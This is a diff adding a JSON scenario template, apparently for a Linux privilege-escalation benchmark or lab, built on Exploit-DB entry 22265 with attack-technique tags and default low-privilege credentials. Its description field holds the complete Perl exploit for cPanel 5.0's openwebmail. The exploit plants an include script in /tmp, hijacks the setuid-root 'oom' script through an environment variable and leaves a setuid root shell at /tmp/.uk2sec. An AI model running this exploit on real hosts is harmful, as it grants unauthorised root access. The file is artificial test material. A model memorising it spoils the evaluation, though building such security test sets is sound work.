@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_22265",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: cPanel 5.0 - 'Openwebmail' Local Privilege Escalation (OSVDB-4221)\n\nExploit source code (22265.pl):\n```\nsource: https://www.securityfocus.com/bid/6885/info\n\nIt has been reported that cPanels' openwebmail package, distributed as part of the cPanel CGI application, is vulnerable to an external file include vulnerability. Exploitation of this issue may result in local user privilage escalation.\n\nBy manipulating environment variables a local attacker may supply, as an include file, an arbitrary local perl-script. This may make it possible to execute the included script with the rights of the openwebmail 'oom' script, which is by default setuid root.\n\nThis vulnerability has been reported to affect cPanel version 5 however, previous versions may also be affected.\n\n#!/usr/bin/perl\n#UK2_SEC Presents...\n#Cpanel Local exploit ;) leaves /bin/zsh rootshell in /tmp\n#Written by:\n#deadbeat\n#For and behalf of UK2_SEC\n#http://oakey.no-ip.com:82/uk2sec/\n#\n#Nice and short exploit ;) yippe don't you love perl..\n#mail us:\n#eip@oakey.no-ip.com (deadbeat)\n#deadbeat@hush.com (deadbeat)\n#c0w_d0g3@yahoo.co.uk (c0w_d0g3)\nprint \"UK2SEC presents...\\n\";\nprint \"Cpanel local epxloit..\\n\";\nprint \"coded by:deadbeat, for UK2SEC...\\n\";\nopen (FILEHANDLE, \">/tmp/openwebmail-shared.pl\") or die (\"Can't open\n/tmp/openwebmail-shared.pl\");\nprint FILEHANDLE \"\\#\\!/usr/bin/perl\\n\";\nprint FILEHANDLE \"\\$cmd = \\\"cp /bin/zsh /tmp/.uk2sec\\;chmod +s\n/tmp/.uk2sec\\\"\\;\";\nclose (FILEHANDLE);\nlocal($ENV{'SCRIPT_FILENAME'} = \"/tmp/openwebmail-shared.pl\");\nsystem(\"suidperl -T /usr/local/cpanel/base/openwebmail/oom\");\nprint \"Done..rootshell should be in: /tmp/.uk2sec\\n\";\nsleep 2;\nprint \"Clean up..\\n\";\n`rm -rf /tmp/openwebmail-shared.pl`;\nprint \"Done...have fun kiddiot...\\n\";\n```",
+  "cve": "OSVDB-4221",
+  "exploitdb_id": "22265",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_22265",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
